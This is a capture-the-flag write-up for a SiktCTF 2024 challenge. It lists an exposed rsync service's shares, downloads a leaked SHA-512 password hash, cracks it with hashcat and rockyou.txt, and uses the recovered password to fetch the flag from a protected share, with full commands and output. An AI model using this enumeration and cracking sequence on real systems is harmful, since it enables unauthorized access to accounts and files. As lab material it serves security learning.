
 <h2>Challenge description:</h2>

```
pwn the service to get the flag
challenges.ctf.sikt.no:5009 
```

<h2>Solve:</h2>
Opening a TCP session reveals that the service running on the port is Rsyncd:

```
nc challenges.ctf.sikt.no 5009
@RSYNCD: 31.0 sha512 sha256 sha1 md5 md4
``` 


Found a username and a password hash in the "open" directory:
```
(.venv) h@flakse:~/git/SiktCTF-2024/pwn/sharing$ rsync -r rsync://challenges.ctf.sikt.no:5009/ 
open            Open share
protected       Protected share
```
The "-r" flag is like "ls" when no local directory is specified.

```
(.venv) h@flakse:~/git/SiktCTF-2024/pwn/sharing$ rsync -r rsync://challenges.ctf.sikt.no:5009/open/ 
drwxr-xr-x          4,096 2024/10/04 14:44:06 .
-rw-rw-r--            128 2024/09/03 12:23:47 password_hash.txt
-rw-rw-r--              3 2024/10/04 14:42:37 users

```
I copy those to my filesystem and attempt to run hashcat

```
(.venv) h@flakse:~/git/SiktCTF-2024/pwn/sharing$ rsync -av rsync://challenges.ctf.sikt.no:5009/open/ ./
receiving incremental file list
./

sent 27 bytes  received 125 bytes  304.00 bytes/sec
total size is 131  speedup is 0.86
```
```
(.venv) h@flakse:~/git/SiktCTF-2024/pwn/sharing$ cat password_hash.txt 
9375d1abdb644a01955bccad12e2f5c2bd8a3e226187e548d99c559a99461453b980123746753d07c169c22a5d9cc75cb158f0e8d8c0e713559775b5e1391fc4

(.venv) h@flakse:~/git/SiktCTF-2024/pwn/sharing$ cat users 
ted
```

```
h@flakse:/mnt/c/Users/haako/Downloads/hashcat-6.2.6$ hashcat 9375d1abdb644a01955bccad12e2f5c2bd8a3e226187e548d99c559a99461453b980123746753d07c169c22a5d9cc75cb158f0e8d8c0e713559775b5e1391fc4
hashcat (v6.2.5) starting in autodetect mode

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-AMD Ryzen 7 1700 Eight-Core Processor, 6922/13908 MB (2048 MB allocatable), 16MCU

The following 7 hash-modes match the structure of your input hash:

      # | Name                                                | Category
  ======+=====================================================+======================================
   1700 | SHA2-512                                            | Raw Hash
  17600 | SHA3-512                                            | Raw Hash
  11800 | GOST R 34.11-2012 (Streebog) 512-bit, big-endian    | Raw Hash
  18000 | Keccak-512                                          | Raw Hash
   6100 | Whirlpool                                           | Raw Hash
   1770 | sha512(utf16le($pass))                              | Raw Hash
  21000 | BitShares v0.x - sha512(sha512_bin(pass))           | Cryptocurrency Wallet

Please specify the hash-mode with -m [hash-mode].

Started: Sun Oct 13 20:53:15 2024
Stopped: Sun Oct 13 20:53:16 2024

``` 
I dont know what hasing algo is used, so i try the first one thinking i can work my way down the list. I use the rockyou.txt dictionary.

```
(.venv) h@flakse:~/git/SiktCTF-2024/pwn/sharing/working$ hashcat -m 1700 9375d1abdb644a01955bccad12e2f5c2bd8a3e226187e548d99c559a99461453b980123746753d07c169c22a5d9cc75cb158f0e8d8c0e713559775b5e1391fc4 rockyou.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-AMD Ryzen 7 1700 Eight-Core Processor, 6922/13908 MB (2048 MB allocatable), 16MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash
* Uses-64-Bit

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 4 MB

Dictionary cache built:
* Filename..: rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 1 sec

9375d1abdb644a01955bccad12e2f5c2bd8a3e226187e548d99c559a99461453b980123746753d07c169c22a5d9cc75cb158f0e8d8c0e713559775b5e1391fc4:grape
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1700 (SHA2-512)
Hash.Target......: 9375d1abdb644a01955bccad12e2f5c2bd8a3e226187e548d99...391fc4
Time.Started.....: Sun Oct 13 21:00:06 2024 (0 secs)
Time.Estimated...: Sun Oct 13 21:00:06 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3474.3 kH/s (1.02ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 32768/14344384 (0.23%)
Rejected.........: 0/32768 (0.00%)
Restore.Point....: 16384/14344384 (0.11%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: chatty -> dyesebel

Started: Sun Oct 13 21:00:04 2024
Stopped: Sun Oct 13 21:00:07 2024

```
![alt text](yippee.gif)

We have the password on the first attempt with the first hashing algorithm.

To show the contents of potfile run the following:
```
h@flakse:~$ hashcat --show  9375d1abdb644a01955bccad12e2f5c2bd8a3e226187e548d99c559a99461453b980123746753d07c169c22a5d9cc75cb158f0e8d8c0e713559775b5e1391fc4 -m 1700

9375d1abdb644a01955bccad12e2f5c2bd8a3e226187e548d99c559a99461453b980123746753d07c169c22a5d9cc75cb158f0e8d8c0e713559775b5e1391fc4:grape
```

The pasword is grape. Let's try to get some files from the protected share.
```
(.venv) h@flakse:~/git/SiktCTF-2024/pwn$ rsync -r rsync://ted@challenges.ctf.sikt.no:5009/protected/
Password: 
dr-xr-xr-x          4,096 2024/10/04 14:44:05 .
-r-xr-xr-x             26 2024/09/03 12:23:47 flag.txt
```

```
(.venv) h@flakse:~/git/SiktCTF-2024/pwn/sharing/working$ rsync -r rsync://ted@challenges.ctf.sikt.no:5009/protected/ ./
Password: grape
```
```
h@flakse:~/git/SiktCTF-2024/pwn/sharing/working$ ls
flag.txt 

cat flag.txt 
SiktCTF{Sh4r1nG_1s_C4r1nG}
```


<h2>Flag:</h2>

```
SiktCTF{Sh4r1nG_1s_C4r1nG}
```